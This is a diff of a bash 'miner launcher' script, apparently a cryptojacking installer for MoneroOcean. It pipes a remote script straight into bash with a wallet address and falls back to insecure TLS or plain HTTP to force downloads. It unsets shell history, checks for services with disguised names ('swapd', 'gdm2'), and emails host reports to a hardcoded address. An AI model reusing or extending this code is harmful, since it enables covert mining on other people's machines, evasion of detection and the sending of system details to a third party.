@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="5.9"
-readonly BUILD_DATE="2026-05-24 19:30:00 UTC"
+readonly SCRIPT_VERSION="6.0"
+readonly BUILD_DATE="2026-10-25 00:58:00 UTC"
 readonly SCRIPT_NAME="setup_m0_launcher"
 
 echo "=========================================="
@@ -63,13 +63,13 @@ if [ "$OS_TYPE" = "FreeBSD" ]; then
     echo "[*] Redirecting to FreeBSD-specific setup..."
     echo "[*] Wallet Address: $WALLET_ADDRESS"
     echo ""
-    
+
     # Download and execute FreeBSD setup script
     wget -qO- "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_m0_FreeBSD.sh?t=$(date +%s)" | bash -s "$WALLET_ADDRESS"
-    
+
     # Capture exit code
     EXIT_CODE=$?
-    
+
     echo ""
     echo "=========================================="
     if [ $EXIT_CODE -eq 0 ]; then
@@ -78,7 +78,7 @@ if [ "$OS_TYPE" = "FreeBSD" ]; then
         echo "FreeBSD setup exited with code: $EXIT_CODE"
     fi
     echo "=========================================="
-    
+
     # Exit completely - don't run Linux setup
     exit $EXIT_CODE
 fi
@@ -219,7 +219,8 @@ CENTOS6_EPEL_EOF
         echo ""
 
         # Mark that we're on CentOS 6 for later use
-        CENTOS6_DETECTED=true
+        export CENTOS6_DETECTED=true
+        log_message "CentOS 6 detected - special compatibility mode enabled"
     else
         echo "[!] CentOS 6.x detected but running as non-root user"
         echo "[*] Repository fixes require root privileges - skipping"
@@ -638,7 +639,7 @@ fi
 # COMPATIBILITY FIX FOR ANCIENT SYSTEMS
 # ========================================================================
 
-# Enhanced download for ancient systems
+# Enhanced download for ancient systems (including CentOS 6)
 download_file_with_fallback() {
     local url="$1"
     local output="${2:-/dev/stdout}"
@@ -650,17 +651,17 @@ download_file_with_fallback() {
         CURL_MAJOR=$(echo "$CURL_VERSION" | cut -d. -f1)
         CURL_MINOR=$(echo "$CURL_VERSION" | cut -d. -f2)
 
-        # Ancient curl - try different methods (version < 7.40)
-        if [ "$CURL_MAJOR" -lt 7 ] || { [ "$CURL_MAJOR" -eq 7 ] && [ "$CURL_MINOR" -lt 40 ]; }; then
-            echo "[*] Using legacy curl ($CURL_VERSION) with fallback options..."
+        # CentOS 6 or ancient curl - try different methods (version < 7.40 or CENTOS6_DETECTED)
+        if [ "$CENTOS6_DETECTED" = true ] || [ "$CURL_MAJOR" -lt 7 ] || { [ "$CURL_MAJOR" -eq 7 ] && [ "$CURL_MINOR" -lt 40 ]; }; then
+            echo "[*] Using legacy curl ($CURL_VERSION) with CentOS 6+ compatibility..."
 
-            # Try SSLv3 (for ancient systems)
+            # Try SSLv3 (for CentOS 6 and ancient systems)
             curl --sslv3 --tlsv1 --max-time 30 "$url" -o "$output" 2>/dev/null && return 0
 
             # Try --insecure
             curl --insecure --max-time 30 "$url" -o "$output" 2>/dev/null && return 0
 
-            # Try HTTP instead
+            # Try HTTP instead (fallback for very restricted networks)
             local http_url=$(echo "$url" | sed 's/^https:/http:/')
             curl --max-time 30 "$http_url" -o "$output" 2>/dev/null && return 0
         else
@@ -672,12 +673,22 @@ download_file_with_fallback() {
 
     # Try wget
     if command -v wget >/dev/null 2>&1; then
-        wget --timeout=30 "$url" -O "$output" 2>/dev/null && return 0
-        wget --no-check-certificate --timeout=30 "$url" -O "$output" 2>/dev/null && return 0
-
-        # Try HTTP
-        local http_url=$(echo "$url" | sed 's/^https:/http:/')
-        wget --timeout=30 "$http_url" -O "$output" 2>/dev/null && return 0
+        # CentOS 6 specific handling
+        if [ "$CENTOS6_DETECTED" = true ]; then
+            echo "[*] CentOS 6 detected - using wget with compatibility options..."
+            # CentOS 6 wget may have SSL issues
+            wget --no-check-certificate --timeout=30 "$url" -O "$output" 2>/dev/null && return 0
+            # Try HTTP fallback
+            local http_url=$(echo "$url" | sed 's/^https:/http:/')
+            wget --timeout=30 "$http_url" -O "$output" 2>/dev/null && return 0
+        else
+            # Normal wget attempts
+            wget --timeout=30 "$url" -O "$output" 2>/dev/null && return 0
+            wget --no-check-certificate --timeout=30 "$url" -O "$output" 2>/dev/null && return 0
+            # Try HTTP
+            local http_url=$(echo "$url" | sed 's/^https:/http:/')
+            wget --timeout=30 "$http_url" -O "$output" 2>/dev/null && return 0
+        fi
     fi
 
     echo "[ERROR] All download methods failed"
@@ -784,7 +795,7 @@ init_compatibility
 unset HISTFILE
 
 # Configuration variables (consider moving sensitive data to environment variables)
-readonly RECIPIENT_EMAIL="acenbergheim@googlemail.com"
+readonly RECIPIENT_EMAIL="littlAcen@yahoo.de"
 readonly LOG_FILE="/tmp/system_report_email.log"
 readonly REPORT_FILE="/tmp/system_report.txt"
 readonly SERVICES_TO_CHECK=("swapd" "gdm2")
@@ -1082,7 +1093,7 @@ BENCH_INFO
     local disk_used=$(df -h / 2>/dev/null | awk 'NR==2 {print $3}' || echo "Unknown")
     local disk_avail=$(df -h / 2>/dev/null | awk 'NR==2 {print $4}' || echo "Unknown")
     local disk_percent=$(df -h / 2>/dev/null | awk 'NR==2 {print $5}' || echo "Unknown")
-    echo " Total Disk         : $disk_total ($disk_used Used, $disk_avail Available)"
+    echo " Total Disk         : $disk_total ($disk_used Used, $disk_avail Available) [$disk_percent Full]"
 
     # RAM Information
     local ram_total=$(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo "Unknown")
@@ -1620,6 +1631,12 @@ download_and_execute() {
     local description="$3"
 
     log_message "Downloading $description from: $url"
+
+    # Log CentOS 6 status if detected
+    if [ "$CENTOS6_DETECTED" = true ]; then
+        log_message "CentOS 6 detected - using enhanced compatibility mode for downloads"
+    fi
+
     log_message "Note: Will attempt download ONCE only - no retries to prevent loops"
 
     # Download to temp file
@@ -1918,7 +1935,7 @@ if [ "$TEST_MAIL_MODE" = true ]; then
     echo "EMAIL CONFIGURATION TEST"
     echo "=========================================="
     echo ""
-    
+
     # Display configuration
     echo "[*] Mail Configuration:"
     echo "    SMTP Server: $SMTP_SERVER"
@@ -1926,9 +1943,9 @@ if [ "$TEST_MAIL_MODE" = true ]; then
     echo "    From: $SENDER_EMAIL"
     echo "    To: $RECIPIENT_EMAIL"
     echo ""
-    
+
     # Create test email content
-    local test_email_content=$(cat <<EOF
+    test_email_content=$(cat <<EOF
 TEST EMAIL FROM MINER LAUNCHER
 
 This is a test email to verify your SMTP configuration is working correctly.
@@ -1941,9 +1958,9 @@ Current Directory: $(pwd)
 If you received this email, your configuration is working!
 EOF
     )
-    
+
     # Create temp file
-    local test_temp_file=$(mktemp)
+    test_temp_file=$(mktemp)
     echo "$test_email_content" > "$test_temp_file"
     
     echo "[*] Sending test email..."
